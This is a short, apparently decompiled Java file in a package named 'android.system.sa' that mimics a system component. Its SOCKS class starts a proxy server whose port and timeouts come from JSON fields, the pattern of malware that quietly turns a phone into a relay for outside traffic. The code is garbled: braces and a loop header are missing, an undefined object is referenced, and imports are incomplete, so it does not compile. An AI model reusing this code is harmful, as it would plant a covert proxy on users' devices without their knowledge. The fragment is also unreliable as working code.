package android.system.sa;
import org.json.JSONObject;
public class SOCKS {
    public static void a(Service service, JSONObject jSONObject) throws JSONException, NumberFormatException, IOException {
        int iIntValue = Integer.valueOf(a.getString("lport")).intValue();
        b = new ProxyServer(identAuthenticator);
        b.a(iIntValue, 5, null);
        identAuthenticator.a(a(".;"), (Hashtable) null);
    static void a() throws JSONException, NumberFormatException {
        ProxyServer.a(Integer.valueOf(a.getString("iddleTimeout")).intValue());
        ProxyServer.b(Integer.valueOf(a.getString("acceptTimeout")).intValue());
        ProxyServer.c(Integer.valueOf(a.getString("udpTimeout")).intValue());
        Proxy2 proxy2B = Proxy2.b("localhost:" + a.getString("lport"));
        proxy2B.a(a(".;"));
        ProxyServer.a(proxy2B);
    static InetRange a(String str) {
        InetRange inetRange = new InetRange();
        StringTokenizer stringTokenizer = new StringTokenizer(str, ";");
            inetRange.a(stringTokenizer.nextToken());
    }
}